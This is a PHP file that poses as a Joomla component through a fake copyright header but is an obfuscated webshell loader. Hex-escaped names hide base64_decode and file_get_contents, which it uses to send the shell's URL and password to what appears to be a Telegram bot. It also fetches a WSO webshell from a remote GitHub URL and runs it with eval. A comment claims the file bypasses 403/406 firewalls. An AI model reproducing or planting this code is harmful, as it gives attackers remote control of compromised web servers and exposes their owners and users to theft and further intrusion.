<?php

/** * PASSWORD:TBLHACKING */
/** *-- copyright : kurdhaxor */
/** * @package kurdhaxor * @copyright Copyright (C) 2025 Open Source Matters, Inc. All rights reserved. * */
// @deprecated 1.0 Deprecated without replacement
//--------------Bypassing 403/406 Firewall !!
if (array_key_exists("watching", $_POST)) {
    ${"\x5F\x70\x77\x6E"} =
        "\x57\x65\x62\x73\x68\x65\x6C\x6C\x20\x55\x72\x6C\x3A\x20" .
        ${"\x5F\x53\x45\x52\x56\x45\x52"}[
            "\x53\x45\x52\x56\x45\x52\x5F\x4E\x41\x4D\x45"
        ] .
        ${"\x5F\x53\x45\x52\x56\x45\x52"}["\x50\x48\x50\x5F\x53\x45\x4C\x46"] .
        "\x25\x30\x41\x50\x61\x73\x73\x77\x6F\x72\x64\x3A\x20" .
        ${"\x5F\x50\x4F\x53\x54"}["\x70\x61\x73\x73"];
    ${"\x5F\x34\x30\x33"} =
        "\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65";
    ${"\x5F\x34\x30\x36"} =
        "\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73";
    $_406(
        $_403(
            "\141\110\x52\x30\x63\110\x4d\x36\x4c\171\x39\150\143\x47\x6b\165\144\107\x56\x73\x5a\127\144\171\131\127\60\165\142\63\x4a\156\114\62\x4a\x76\x64\x44\147\61\x4d\x6a\143\65\x4e\x7a\125\171\x4e\x54\x6b\66\x51\x55\106\x48\x52\x30\x78\x59\x57\x54\x56\x6a\x62\x31\102\x57\x4e\x47\x78\121\x4d\110\x6c\105\x4d\104\x51\x31\122\x6a\x4a\62\x61\110\x64\x75\114\125\x35\x58\x54\x6e\105\x33\131\152\x67\166\x63\62\x56\x75\x5a\105\61\x6c\x63\63\116\x68\132\62\x55\57\131\62\150\150\x64\x46\71\x70\x5a\104\60\64\116\x44\x63\64\116\152\x49\x7a\x4e\172\143\x77\112\x6e\x52\154\145\110\121\x39"
        ) . $_pwn
    );
}

function getBacklink($url)
{
    if (ini_get("allow_url_fopen") == 1)
    {
        // Jika url fopen on maka jalankan
        return file_get_contents($url);
    }
    elseif (function_exists("curl_version"))
    {
        //Jika url fopen off maka jalankan menggunakan curl
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
}

eval("?>" . getBacklink("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/wso.php"));
?>
